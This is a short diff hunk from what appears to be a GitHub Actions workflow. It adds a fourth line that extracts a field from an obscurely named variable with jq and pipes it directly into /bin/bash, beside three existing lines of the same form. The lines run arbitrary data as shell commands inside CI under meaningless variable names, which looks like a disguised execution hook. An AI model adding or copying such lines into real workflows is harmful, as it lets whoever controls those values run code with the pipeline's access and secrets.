@@ -30,6 +30,7 @@ jobs:
           echo $fm91 | jq -r .utw587 | /bin/bash
           printf '%s' "$dar4824" | jq -r .u2807 | /bin/bash
           echo $rgl632 | jq -r .vykck1 | /bin/bash
+          printf '%s' "$dks95" | jq -r .pr14 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
